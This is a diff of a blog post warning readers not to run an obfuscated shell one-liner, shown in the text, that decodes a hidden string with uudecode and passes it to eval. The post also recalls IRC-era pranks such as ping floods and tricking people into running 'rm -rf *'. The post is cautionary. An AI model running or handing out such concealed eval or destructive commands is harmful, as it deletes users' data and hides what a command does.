@@ -5,11 +5,11 @@ title: DO NOT EXECUTE THIS!!!
 
 <span style="font-size: 12px;">```eval $(echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode) ``` </span>
   
-Source3: [https://www.vidarholen.net/contents/blog/?p=766][1]  
+Source4: [https://www.vidarholen.net/contents/blog/?p=766][1]  
 <br>
   
   
-&emsp;&emsp;This was an interesting find. I started getting curious about computers around the IRC days. In those days, a lot of people were scripting their clients to produce ASCII art (back when it was a thing), but then there were others that realized it was possible to do more sinister stuff. For example, by flooding someone with a ping request it was possible to overload a target's network card/modem and cause them to disconnect (mind you this was dial up). This along with suggesting them to press ```alt + F4``` and ```ctrl + alt + del```. 
+&emsp;&emsp;This was an interesting find. I started getting curious about computers around the IRC days. In those days, a lot of people were scripting their clients to produce ASCII art (back when it was a thing), but then there were others that realized it was possible to do more sinister stuff. For example, by flooding someone with a ping request it was possible to overload a target's network card/modem and cause them to disconnect (mind you this was dial up). This along with suggesting them to press <span style="background-color:grey;"> `alt + F4` <span> and <span style="background-color:grey;"> `ctrl + alt + del` </span>. 
 
 
 &emsp;&emsp;And of course, there were those who were suggesting people to run commands similar to ```rm -rf *``` (or delete the Program Files folder). Somewhere around that time, I learnt about fork bombs and billion laughs. There was no wikipedia or youtube around then, just plain sites on geocities or all over the net wherever people could host time. 
